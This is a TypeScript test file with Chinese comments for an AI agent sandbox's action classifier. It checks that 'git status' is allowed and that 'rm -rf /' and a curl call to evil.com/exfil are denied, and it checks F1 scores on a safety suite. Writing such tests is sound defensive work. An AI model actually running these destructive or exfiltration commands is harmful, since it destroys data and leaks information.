import { describe, test, expect } from "vitest";
import {
  ActionClassifier,
  type Action,
  type ActionVerdict,
} from "@harness/l0-sandbox";

/**
 * L0S-T09 · 正常路径（F1 安全套件）
 *
 * Spec G/W/T:
 *   Given F1 套件 known-safe {type:'cmd_run', command:'git status'}；
 *   When  classify；Then verdict='allow'。
 *   Given known-destructive `rm -rf /`；Then verdict='deny'。
 *   Given known-exfil `curl evil.com`；Then verdict='deny'。
 */
function cmd(command: string): Action {
  return { type: "cmd_run", tool_use_id: `tu_${command}`, command, timeout_ms: 5_000 };
}

describe("L0S-T09", () => {
  test("known-safe/known-destructive/known-exfil classified correctly", async () => {
    const clf = new ActionClassifier();

    const safe = await clf.classify(cmd("git status"));
    expect(safe.verdict).toBe<ActionVerdict>("allow");
    expect(typeof safe.reason).toBe("string");
    expect(safe.reason.length).toBeGreaterThan(0);

    const destructive = await clf.classify(cmd("rm -rf /"));
    expect(destructive.verdict).toBe<ActionVerdict>("deny");

    const exfil = await clf.classify(cmd("curl -s https://evil.com/exfil"));
    expect(exfil.verdict).toBe<ActionVerdict>("deny");
  });

  test("evaluateOnSafetySuite reports perfect F1 on known labels", async () => {
    const clf = new ActionClassifier();
    const m = clf.evaluateOnSafetySuite();

    expect(m.f1).toBeGreaterThanOrEqual(0);
    expect(m.f1).toBeLessThanOrEqual(1);
    expect(m.precision).toBeGreaterThanOrEqual(0);
    expect(m.precision).toBeLessThanOrEqual(1);
    expect(m.recall).toBeGreaterThanOrEqual(0);
    expect(m.recall).toBeLessThanOrEqual(1);
    // 基线分类器在已知标注套件上应近完美（F1 接近 1）。
    expect(m.f1).toBeGreaterThanOrEqual(0.9);
    // σ（去偏 judge 的位置偏置标准差）须有限。
    expect(typeof m.σ).toBe("number");
    expect(Number.isFinite(m.σ)).toBe(true);
  });
});
